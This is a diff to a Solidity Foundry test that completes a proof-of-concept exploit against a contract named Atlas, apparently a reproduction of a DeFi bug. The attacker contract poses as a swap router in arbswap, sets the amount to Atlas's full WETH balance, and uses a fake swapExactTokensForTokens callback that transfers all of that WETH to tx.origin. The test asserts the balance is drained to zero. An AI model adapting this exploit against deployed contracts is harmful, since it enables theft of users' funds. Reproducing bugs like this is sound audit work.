@@ -6,10 +6,50 @@ import {Atlas, IAtlas} from "../src/bug/Atlas.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract AttackAtlas {
+    address constant weth = 0x4200000000000000000000000000000000000006;
+
     function attack(address atlasAddr) external {
         Atlas atlas = Atlas(atlasAddr);
-        IAtlas.SwapData memory swapdata;
+
+        address[] memory routers = new address[](1);
+        routers[0] = address(this);
+        uint256[] memory routerType = new uint256[](1);
+        uint256[] memory pairBinId = new uint256[](1);
+        address[] memory tokensIn = new address[](1);
+        tokensIn[0] = weth;
+        address[] memory tokensOut = new address[](1);
+        tokensOut[0] = weth;
+        int128[] memory curvei = new int128[](1);
+        int128[] memory curvej = new int128[](1);
+        uint256 amt = atlas.getBalance(weth);
+
+        IAtlas.SwapData memory swapdata = IAtlas.SwapData({
+            routers: routers,
+            routerType: routerType,
+            pairBinId: pairBinId,
+            tokensIn: tokensIn,
+            tokensOut: tokensOut,
+            curvei: curvei,
+            curvej: curvej,
+            amt: amt
+        });
         atlas.arbswap(swapdata);
+    }
+
+    function swapExactTokensForTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts) {
+        amounts = new uint256[](1);
+        amounts[0] = type(uint256).max;
+        IERC20(weth).transferFrom(
+            msg.sender,
+            tx.origin,
+            IERC20(weth).balanceOf(msg.sender)
+        );
     }
 }
 
@@ -25,12 +65,12 @@ contract AttackAtlasTest is Test {
 
     function testAttack() external {
         console.log("Attack Before:");
-        console.log(IERC20(weth).balanceOf(atlas));
+        console.log("Atlas ewth:", IERC20(weth).balanceOf(atlas));
 
         _attack();
 
         console.log("Attack After:");
-        console.log(IERC20(weth).balanceOf(atlas));
+        console.log("Atlas ewth:", IERC20(weth).balanceOf(atlas));
         assertEq(IERC20(weth).balanceOf(atlas), 0);
     }
 
